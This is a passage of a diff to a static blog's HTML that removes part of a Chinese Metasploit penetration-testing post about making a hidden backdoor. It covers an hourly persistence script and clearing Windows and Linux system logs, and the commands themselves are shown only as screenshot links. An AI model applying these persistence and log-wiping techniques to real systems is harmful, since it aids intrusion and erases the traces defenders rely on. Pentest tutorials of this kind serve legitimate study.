-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204145273.png" alt="image-20210819204145273"></p>
-<p>效果说明：靶机系统让脚本每小时启动一次</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204258879.png" alt="image-20210819204258879"></p>
-<h2 id="五、清理系统日志"><a href="#五、清理系统日志" class="headerlink" title="五、清理系统日志"></a>五、清理系统日志</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204504875.png" alt="image-20210819204504875"></p>
-<h4 id="5-1-window日志清理"><a href="#5-1-window日志清理" class="headerlink" title="5.1 window日志清理"></a><strong>5.1 window日志清理</strong></h4><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204549925.png" alt="image-20210819204549925"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204652982.png" alt="image-20210819204652982"></p>
-<p>​        也可以</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204737145.png" alt="image-20210819204737145"></p>
-<h4 id="5-2-Linux日志清理"><a href="#5-2-Linux日志清理" class="headerlink" title="5.2 Linux日志清理"></a><strong>5.2 Linux日志清理</strong></h4><p>kali进入其shell里操作</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204946095.png" alt="image-20210819204946095"></p>
-<p>  也可以</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205049062.png" alt="image-20210819205049062"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205105885.png" alt="image-20210819205105885"></p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205150600.png" alt="image-20210819205150600"></p>
-<p>还可以</p>
-<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205205428.png" alt="image-20210819205205428"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1809,7 +1688,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-count">65</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
